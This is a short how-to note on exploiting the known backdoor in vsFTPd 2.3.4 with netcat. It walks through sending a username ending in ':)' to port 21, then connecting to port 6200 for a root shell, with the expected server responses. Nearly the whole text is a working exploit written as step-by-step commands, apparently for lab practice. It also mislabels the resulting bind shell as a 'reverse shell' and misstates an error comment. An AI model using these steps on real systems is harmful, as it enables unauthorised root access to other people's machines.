Reverse shell with FTP, without Metasploit

!Check to make sure the system is running FTP v2.3.4 
!Use netcat

nc *ipaddress* 21
220 (vsFTPd 2.3.4)

user *random characters*:)       !!The ":)" is the important part
331 Please specify the password.
pass *random characters*         !!This then makes Port 6200 open

In a new terminal ---- 

!netcat into that new port

nc -v *ipaddress* 6200

IPADDRESS: inverse host lookup failed: Unknown host  !This error does mean anything
(UNKNOWN) [IPDRESS] 6200 (?) open                    !This means you have access to the root


